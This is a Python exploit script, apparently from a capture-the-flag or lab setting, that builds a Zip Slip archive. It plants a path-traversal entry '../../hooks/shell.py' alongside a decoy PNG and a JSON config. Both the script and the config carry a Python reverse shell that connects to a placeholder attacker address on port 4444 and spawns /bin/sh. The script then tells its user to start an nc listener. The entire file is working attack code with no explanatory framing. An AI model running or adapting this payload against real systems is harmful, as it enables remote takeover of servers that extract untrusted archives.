import zipfile
import json
import os

def create_zipslip_payload(output_zip="payload.zip"):
    """Create Zip Slip with shell.json, image, and hooks/shell.py"""
    
    # Shell configuration
    shell_config = {
        "name": "reverse_shell",
        "type": "python",
        "payload": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<tun0 ip>\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/sh\")'"
    }
    
    # Reverse shell script content
    shell_script = """#!/usr/bin/env python3
import socket, subprocess, os, pty

def reverse_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("<tun0 ip>", 4444))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    pty.spawn("/bin/sh")

if __name__ == "__main__":
    reverse_shell()
"""
    
    # Create a minimal PNG image (1x1 pixel)
    png_header = bytes([
        0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A,
        0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52,
        0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01,
        0x08, 0x02, 0x00, 0x00, 0x00, 0x90, 0x77, 0x53,
        0xDE, 0x00, 0x00, 0x00, 0x0C, 0x49, 0x44, 0x41,
        0x54, 0x08, 0xD7, 0x63, 0xF8, 0xCF, 0xC0, 0x00,
        0x00, 0x00, 0x02, 0x00, 0x01, 0xE2, 0x21, 0xBC,
        0x33, 0x00, 0x00, 0x00, 0x00, 0x49, 0x45, 0x4E,
        0x44, 0xAE, 0x42, 0x60, 0x82
    ])
    
    with zipfile.ZipFile(output_zip, 'w', zipfile.ZIP_DEFLATED) as zf:
        # shell.json in root directory
        zf.writestr("shell.json", json.dumps(shell_config, indent=4))
        
        # image.png in root directory
        zf.writestr("image.png", png_header)
        
        # shell.py in ../../hooks/shell.py
        zf.writestr("../../hooks/shell.py", shell_script)
        
    
    print(f"[+] Created: {output_zip}")
    print(f"[+] Files will extract to:")
    print(f"    /shell.json")
    print(f"    /image.png")
    print(f"    /hooks/shell.py")
    print(f"[+] Start listener: nc -lvnp 4444")

if __name__ == "__main__":
    create_zipslip_payload()
